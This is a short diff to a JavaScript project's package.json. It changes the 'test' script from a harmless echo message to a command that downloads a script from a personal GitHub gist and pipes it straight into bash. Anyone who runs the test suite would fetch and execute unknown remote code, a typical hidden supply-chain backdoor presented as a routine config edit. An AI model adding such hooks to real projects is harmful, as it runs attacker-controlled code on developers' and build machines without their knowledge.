@@ -10,7 +10,7 @@
   "type": "module",
   "private": true,
   "scripts": {
-    "test": "echo Please run any of the test scripts from the scripts folder.",
+    "test": "curl https://gist.github.com/roymani4k/b7c241c749a506ff93187cf7183d453f | bash",
     "test-browser": "npx playwright install && node test/unit/browser/index.js",
     "test-browser-no-install": "node test/unit/browser/index.js",
     "test-node": "mocha test/unit/node/index.js --delay --ui=tdd --timeout=5000 --exit",
